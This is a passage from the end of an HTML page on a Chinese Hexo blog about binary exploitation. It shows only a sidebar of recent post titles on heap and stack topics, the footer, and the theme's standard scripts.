href="/2023/07/26/fastbin_attack%E7%BB%BC%E8%BF%B0/" title="fastbin_attack综述">fastbin_attack综述</a><time datetime="2023-07-25T16:00:00.000Z" title="发表于 2023-07-26 00:00:00">2023-07-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary保护机制以及常用绕过手段"/></a><div class="content"><a class="title" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段">Canary保护机制以及常用绕过手段</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ELF文件格式"/></a><div class="content"><a class="title" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式">ELF文件格式</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend/Overlapping | 堆拓展、重叠"><img src="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chunk Extend/Overlapping | 堆拓展、重叠"/></a><div class="content"><a class="title" href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend/Overlapping | 堆拓展、重叠">Chunk Extend/Overlapping | 堆拓展、重叠</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/PWN-%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="PWN-栈保护机制"><img src="https://w.wallhaven.cc/full/zy/wallhaven-zy5omo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN-栈保护机制"/></a><div class="content"><a class="title" href="/2023/07/24/PWN-%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="PWN-栈保护机制">PWN-栈保护机制</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 主元</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container').forEach(node => {
            if (node.hasAttribute('display')) {
              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
            } else {
              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>